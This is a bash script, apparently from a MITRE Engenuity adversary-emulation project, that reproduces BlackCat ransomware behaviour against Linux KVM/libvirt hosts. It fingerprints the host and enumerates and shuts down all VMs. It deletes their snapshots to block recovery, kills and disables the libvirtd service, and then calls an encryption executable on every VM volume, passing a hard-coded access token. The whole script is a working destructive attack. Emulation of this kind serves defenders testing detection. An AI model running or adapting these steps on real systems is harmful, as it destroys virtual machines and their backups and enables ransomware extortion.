#!/bin/bash

# ---------------------------------------------------------------------------
# digirevenge.sh - Alternative bash script with an encryption executable if executing BlackCat (Linux) fails

# Copyright 2024 MITRE Engenuity. Approved for public release. Document number CT0005.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: ./digirevenge.sh path_to_encryption_executable

# Revision History:

# --------------------------------------------------------------------------- 

get_snapshots() {
    full_output=$(virsh snapshot-list "$1");
    trimmed_output=$(echo "$full_output" | tail -n +3);
    if [[ ! -z "${trimmed_output// }" ]]; then
        # handle cases where snapshot name may contain spaces
        substr="Creation Time";
        remainder="${full_output#*$substr}";
        index=$(( ${#full_output} - ${#remainder} - ${#substr} ))
        echo "$trimmed_output" | while IFS= read -r entry ; do 
            trimmed="${entry:0:$index}";
            echo $trimmed;
        done;
    fi
}

if [ "$#" -ne 1 ]; then 
    echo "USAGE: ./digirevenge.sh path_to_encryption_executable"
    exit 1;
fi 

# initial discovery
echo "[INFO] Machine UUID: $(cat /sys/class/dmi/id/product_uuid)"
echo "[INFO] Currently running as user: $(whoami)"
echo "[INFO] Currently running on host: $(hostname)"

# Check virsh version
echo "[INFO] Checking virsh version"
virsh version || { echo "[ERROR] virsh not installed. Exiting"; exit 1; }

# enumerate VMs
echo "[INFO] Discovering VMs:"
vms=$(virsh -q list --all | awk '{print $2}');

if [[ -z "${vms// }" ]]; then 
    echo "[INFO] No VMs found. Terminating.";
    exit 2;
fi

echo "[INFO] Discovered the following VMs:"
echo "$vms";

# shutdown VMs
echo "[INFO] Shutting down VMs:"
echo "$vms" | while IFS= read -r vm ; do 
    virsh shutdown --domain "$vm";
done;

# enumerate and delete snapshots
echo "[INFO] Enumerating and deleting snapshots:"
echo "$vms" | while IFS= read -r vm ; do 
    snapshots=$(get_snapshots "$vm");
    if [[ -z "${snapshots// }" ]]; then 
        echo "[INFO] No snapshots found for VM $vm.";
    else
        echo "[INFO] Found snapshots to delete for VM $vm";
        echo "$snapshots";
        echo "$snapshots" | while IFS= read -r snapshot; do 
            virsh snapshot-delete --domain "$vm" --snapshotname "$snapshot";    
        done;
    fi
done;

# Get VM volume paths
echo "[INFO] Getting VM volume paths:"
volumes=$(virsh -q vol-list default | awk '{print $2}');

if [[ -z "${volumes// }" ]]; then 
    echo "[INFO] No VM volumes found. Terminating.";
    exit 3;
fi

echo "[INFO] Discovered the following VM volume paths:"
echo "$volumes";

# Wait for VMs to finish shutting down
echo "[INFO] Waiting 30 seconds for VMs to finish shutting down";
sleep 30;

# terminate relevant processes and services to prepare for encryption
echo "[INFO] Terminating processes for encryption:"
processes=("libvirtd" "virsh" "libvirt-dbus");
for process in ${processes[@]}; do
    killall "$process";
done

echo "[INFO] Terminating libvirtd service for encryption:"
service="libvirtd";
systemctl stop "$service" && systemctl disable "$service" && systemctl daemon-reload;

# Perform encryption
echo "[INFO] Running encryption binary to encrypt VM volumes";
args=$(echo -n "$volumes" | tr '\n' ' ');
bash -c "$1 --access-token 15742aa362a84ba3 --paths $args";

